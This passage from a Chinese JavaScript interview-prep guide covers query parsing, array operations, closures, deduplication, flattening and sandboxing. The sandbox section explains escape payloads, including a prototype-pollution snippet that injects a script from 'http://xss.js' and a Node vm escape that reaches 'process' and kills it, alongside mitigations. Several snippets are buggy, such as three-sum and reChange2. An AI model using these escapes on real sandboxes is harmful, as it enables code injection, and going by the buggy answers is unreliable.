     if (r != null) 
     context = r[2]; 
    reg = null; 
    r = null; 
    return context == null || context == "" || context == "undefined" ? "" : context; 
 }
alert(GetQueryString("j"));
```

 单个参数的获取方法

```js
function GetRequest() {
         var url = location.search; //获取url中"?"符后的字串
         if (url.indexOf("?") != -1) {? //判断是否有参数
                  var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串
                  strs = str.split("=");? //用等号进行分隔 （因为知道只有一个参数 
                                          //所以直接用等号进分隔 如果有多个参数 要用&号分隔 再用等号进行分隔）
                  alert(strs[1]);???? //直接弹出第一个参数 （如果有多个参数 还要进行循环的）
         }
  }
```





### 48、js中两个数组怎么取交集+(差集、并集、补集)

#### ES5：

交集：

```js
let arr1 = [1, 2, 3, 4, 5, 6];
let arr2 = [3, 4, 5, 6, 7, 8, 9];
function getIntersection(arr1, arr2) {
  let newArr = arr1.filter((item) => {
    console.log(arr2.indexOf(item));
    return arr2.indexOf(item) > -1
  });
  return newArr;
}
// console.log(getIntersection(arr1, arr2));


```

并集：

```js
function getSet(arr1, arr2) {
  let newArr = arr2.filter((item) => {
    return arr1.indexOf(item) == -1;
  });
  return arr1.concat(newArr);
}
console.log(getSet(arr1, arr2));

```

补集：

```js
function getComplement(arr1, arr2) {
  let newArr1 = arr1.filter((item) => {
    return arr2.indexOf(item) == -1;
  });
  let newArr2 = arr2.filter((item) => {
    return arr1.indexOf(item) == -1;
  });
  return newArr1.concat(newArr2);
}
```



#### ES6：

交集：

```js
let arr1 = [1, 2, 3, 4, 5, 6];
let arr2 = [3, 4, 5, 6, 7, 8, 9];

function getIntersection(arr1, arr2) {
  let y = new Set(arr2);
  return arr1.filter((x) => y.has(x));
}
console.log(getIntersection(arr1, arr2));

```



并集：

```js
let arr1 = [1, 2, 3, 4, 5, 6];
let arr2 = [3, 4, 5, 6, 7, 8, 9];
function getSet(arr1, arr2) {
  let x = arr1.concat(arr2);
  return [...new Set(x)];
}
console.log(getSet(arr1, arr2));

```



### 49、~~沙箱隔离怎么做的什么原理~~

**参考答案：**

沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。

实现沙箱的三种方法

1. 借助with + new Function

首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”：

```javascript
function compileCode (src) {    
  src = 'with (exposeObj) {' + src + '}'  
  return new Function('exposeObj', src)   
}
```

接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写：

```javascript
function compileCode (src) {    
  src = `with (exposeObj) { ${src} }` 
  return new Function('exposeObj', src)   
} 
function proxyObj(originObj){ 
    let exposeObj = new Proxy(originObj,{ 
        has:(target,key)=>{ 
            if(["console","Math","Date"].indexOf(key)>=0){  
                return target[key]  
            } 
            if(!target.hasOwnProperty(key)){  
                throw new Error(`Illegal operation for key ${key}`) 
            } 
            return target[key]  
        },
    })  
    return exposeObj  

} 
function createSandbox(src,obj){  
 let proxy = proxyObj(obj)  
 compileCode(src).call(proxy,proxy) //绑定this 防止this访问window 
}
```

通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：

```javascript
const testObj = { 
    value:1,  
    a:{ 
        b:  
    } 
} 
createSandbox("value='haha';console.log(a)",testObj)
```

看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.**proto**就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。

```javascript
createSandbox(` 
a.b.__proto__.toString = ()=>{  
 new (()=>{}).constructor("var script = document.createElement('script'); 
 script.src = 'http://xss.js';
 script.type = 'text/javascript'; 
 document.body.appendChild(script);")() 
}
`,testObj)  
console.log(testObj.a.b.__proto__.toString())
```

例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。

你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过**proto**查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：

```javascript
({}).__proto__.toString= ()=>{console.log(111)};
```

可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。

1. 借助iframe实现沙箱

前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱

```javascript
<iframe sandbox src="..."></iframe>
```

 但是这也会带来一些限制：

1. script脚本不能执行

2. 不能发送ajax请求

3. 不能使用本地存储，即localStorage,cookie等

4. 不能创建新的弹窗和window

5. 不能发送表单

6. 不能加载额外插件比如flash等

   不过别方，你可以对这个iframe标签进行一些配置：

   ![img](https://static.nowcoder.com/images/activity/2021jxy/front/images/p.png)

接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。

1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。

2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。

3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制

简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。

1. nodejs中的沙箱

nodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。

```javascript
const vm = require('vm'); 
const x = 1;  
const sandbox = { x: 2 }; 
vm.createContext(sandbox); // Contextify the sandbox. 
const code = 'x += 40; var y = 17;';  
vm.runInContext(code, sandbox); 
console.log(sandbox.x); // 42 
console.log(sandbox.y); // 17 
console.log(x); // 1;   y is not defined.
```

vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。

但是vm是绝对安全的吗？不一定。

```javascript
const vm = require('vm'); 
vm.runInNewContext("this.constructor.constructor('return process')().exit()")
```

通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。

```javascript
let ctx = Object.create(null);  
ctx.a = 1; // ctx上不能包含引用类型的属性 
vm.runInNewContext("this.constructor.constructor('return process')().exit()", ctx);
```

让我们来看一下TSW中是怎么使用的：

```javascript
const vm = require('vm'); 
const SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // 沙堆  
... 
if (opt.jsonpCallback) {  
  code = `var result=null; var ${opt.jsonpCallback}=function($1){result=$1}; ${responseText}; return result;`;  
  obj = new SbFunction(code)(); 
}   
... 
```

通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。

### 53、闭包的理解

**参考答案：**

闭包：

 一个函数和对其周围状态（**lexical environment，词法环境**）的引用捆绑在一起（或者说函数被引用包围）， 这样的组合就是**闭包**（**closure**）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。

闭包的特点：

 让外部访问函数内部变量成为可能；
​ 可以避免使用全局变量，防止全局变量污染；
​ 可以让局部变量常驻在内存中；
​ 会造成内存泄漏（有一块内存空间被长期占用，而不被释放）

应用场景

1. 埋点（是网站分析的一种常用的数据采集方法）计数器

```js
function count() {
  var num = 0;
  return function () {
    return ++num
  }
}
var getNum = count();
var getNewNum = count();
document.querySelectorAll('button')[0].onclick = function(){
  console.log('点击加入购物车次数： '+getNum());
}
document.querySelectorAll('button')[1].onclick = function(){
  console.log('点击付款次数： '+getNewNum());
}    
```

1. 事件+循环

按照以下方式添加事件，打印出来的i不是按照序号的

形成原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境

```js
   var lis = document.querySelectorAll('li');
   for (var i = 0; i < lis.length; i++) {
            lis[i].onclick = function () {
                alert(i)
            }       
    }
```

解决办法：

使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境

```js
var lis = document.querySelectorAll('li');  
for (var i = 0; i < lis.length; i++) {
     (function (j) {
                lis[j].onclick = function () {
                    alert(j)
                }
            })(i)
 }
```










### JS应用篇

#### 字符串中的单词逆序输出（手写）

```js
let str = "Hello My name is kif and i am from XTU";
function reChange1(str) {
  return str.split("").reverse().join("");
}
console.log(reChange1(str));
```



```js
let str = "Hello My name is kif and i am from XTU";
function reChange2(str) {
  let newSTr = "";
  for (let i = str.length - 1; i >= 0; i--) {
    newSTr += str.charAt(i);
  }
  return newSTr

console.log(reChange2(str));
```



#### function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组

**参考答案：**

把考点拆成了4个小项；需要用递归算法实现：
a) 生成一个长度为n的空数组arr。
b) 生成一个（min－max）之间的随机整数rand。
c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for/while等循环]
d) 最终输出一个长度为n，且内容不重复的数组arr。



#### Math.random

```js
//产生一个[0，1)之间的随机数。
Math.random()：
 
//返回指定范围的随机数(m-n之间)的公式:
Math.random()*(n-m)+m；
或者
Math.random()*(n+1-m)+m
```



```js
function buildArray(arr, n, min, max) {
    var num = Math.floor(Math.random() * (max - min + 1)) + min;
    if (!arr.includes(num)) { arr.push(num); }
    return arr.length === n ? arr : buildArray(arr, n, min, max);
}
var result = buildArray([], 5, 2, 32);
console.table(result);
```



```js
function rand(min, max, N) {
  let arr = [];
  let l = 0;
  console.log(N);
  for (; l < N; ) {
    // console.log(l);
    let r = Math.floor(Math.random() * (max - min)) + min;
    if (!arr.includes(r)) {
      console.log(r);
      arr.push(r);
      l++;
    }
  }
  return arr;
}
console.log(rand(2, 61, 5));

```



#### 实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路

**参考答案**：

**1.遍历数组法**

它是最简单的数组去重方法（indexOf方法）

实现思路：新建一个数组，遍历去要重的数组，当值不在新数组的时候（indexOf为-1）就加入该新数组中；

```js
var arr=[2,8,5,0,5,2,6,7,2];
function unique1(arr){
  var hash=[];
  for (var i = 0; i < arr.length; i++) {
     if(hash.indexOf(arr[i])==-1){
      hash.push(arr[i]);
     }
  }
  return hash;
}
```

**2.数组下标判断法**

调用indexOf方法，性能和方法1差不多

实现思路：如果当前数组的第 i 项在当前数组中第一次出现的位置不是 i，那么表示第 i 项是重复的，忽略掉。否则存入结果数组。

```js
function unique2(arr){
  var hash=[];
  for (var i = 0; i < arr.length; i++) {
     if(arr.indexOf(arr[i])==i){
      hash.push(arr[i]);
     }
  }
  return hash;
}
```

**3.排序后相邻去除法**

实现思路：给传入的数组排序，排序后相同的值会相邻，然后遍历排序后数组时，新数组只加入不与前一值重复的值。

```js
function unique3(arr){
  arr.sort();
  var hash=[arr[0]];
  for (var i = 1; i < arr.length; i++) {
     if(arr[i]!=hash[hash.length-1]){
      hash.push(arr[i]);
     }
  }
  return hash;
}
```

**4.优化遍历数组法（推荐）**

实现思路：双层循环，外循环表示从0到arr.length，内循环表示从i+1到arr.length

将没重复的右边值放入新数组。（检测到有重复值时终止当前循环同时进入外层循环的下一轮判断）

```js
function unique4(arr){
  var hash=[];
  for (var i = 0; i < arr.length; i++) {
    for (var j = i+1; j < arr.length; j++) {
      if(arr[i]===arr[j]){
        ++i;
        break;
        }
    }
      hash.push(arr[i]);
  }
  return hash;
}
```

**5.ES6实现**

基本思路：ES6提供了新的数据结构Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。

Set函数可以接受一个数组（或类似数组的对象）作为参数，用来初始化。

```js
function unique5(arr){
  var x = new Set(arr);
 return [...x];
}
```

扩展：如果重复，则去掉该元素

数组下标去重

```js
function unique22(arr){
  var hash=[];
  for (var i = 0; i < arr.length; i++) {
     if(arr.indexOf(arr[i])==arr.lastIndexOf(arr[i])){
      hash.push(arr[i]);
     }
  }
  return hash;
}
```

#### 传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]

```js
let a = [1, [[2], '3', 4], 5];
function change(arr) {
  let x = arr.toString();
  let list = x.split(",");
  let ans = list.map((i) => {
    // console.log(i)
    return typeof i === 'string' ? Number(i) : i;
  });
  // console.log(ans)
  return ans;
}
console.log(change(a));

```

​       

ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中：

```js
var arr = [1, [2, [3, 4]]];
console.log([].concat(...arr)); // [1, 2, [3, 4]]
```

我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：

```js
// 方法4
var arr = [1, [2, [3, 4]]];

function flatten(arr) {

    while (arr.some(item => Array.isArray(item))) {
        arr = [].concat(...arr);
    }

    return arr;
}

console.log(flatten(arr))
```



#### 用正则和非正则实现12345678.12=》12，345，678.12

```js
let num = 12345678.12
//12,345,678.12
function change(number) {
    let s = number.toString()
    //console.log(s)
    let L = s.split('.')
    let num_s
    L.length == 2 ? num_s = L[1] : num_s = -1
    let N=L[0]
    let num_f
    let y =N.length % 3
    num_f = N.slice(0, y)

    for (let i = y; i < N.length; i += 3) {
        num_f += ',' + N.slice(i,i+3)
    }
    if (num_s != -1) {
        num_f += '.' + num_s
    }
    return num_f
}
console.log(change(num))//12,345,678.12
```



#### 写一个判断是否是空对象的函数

**参考答案：**

```js
function isEmpty(value) {
    return (
        value === null || value === undefined ||
        (typeof value === 'object' && Object.keys(value).length === 0) 
    )
}
```



#### **给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度**

```js
function countWord(str) {
  let arr = [];
  let count = 0;
  for (let i = 0; i < str.length; i++) {
    console.log(str.charAt(i));
    if (!arr.includes(str.charAt(i))) {
      arr.push(str[i]);
      count++;
    }
  }
  console.log(arr);
  return count;
}
let str = "qqdwqcasdffdghjsbjhbm";
console.log(countWord(str));

```



#### 三数之和

**参考答案：**

题目描述

给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？找出所有满足条件且不重复的三元组。

注意：答案中不可以包含重复的三元组。

```js
//例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]，
//满足要求的三元组集合为：
[
  [-1, 0, 1],
  [-1, -1, 2]
]
```





```js
let nums = [-1, 0, 1, 2, -1, -4];
function getNum(nums) {
  if (nums.length < 3) {
    return [];
  }
  let ans = [];
  nums.sort((a, b) => a - b);
  console.log(nums);
  for (let i = 0; i < nums.length; i++) {
    if (nums[i] > 0) {
      break;
    }
    let l = i + 1;
    let r = nums.length - 1;
    while (l < r) {
      let sum = nums[i] + nums[l] + nums[r];
      if (sum == 0) {
        ans.push(nums[i], nums[l], nums[r]);
        l++;
        r++;
      } else if (sum > 0) {
        r--;
      } else {
        l++;
      }
    }
  }
  return ans;
}
console.log(getNum(nums));

```



#### js判断数据类型

```js
function getTypeOf(x) {
  if (typeof (x) != 'object') {
      return typeof (x)
  } else {
      return Object.prototype.toString.apply(x)
  }
}
let test = [12, [], function () { }, true, 'kif']
let x
for (x in test) (
  console.log(getTypeOf(test[x]))
)
```



#### **arr.flat(Infinity)**

flat作为ES6的新特性，只要调用该方法便可以简单快速实现数组的扁平化，使用起来确实很容易上手(可以说是0门槛)，但是只会这个方法是没有办法得到面试官的青睐的！

```js
const arr = [1, [2, [3, [4, [5]]]]];``// 1. flat自动展开``let arr1 = arr.flat(Infinity);``console.log(arr1); ``// [ 1, 2, 3, 4, 5 ]
```



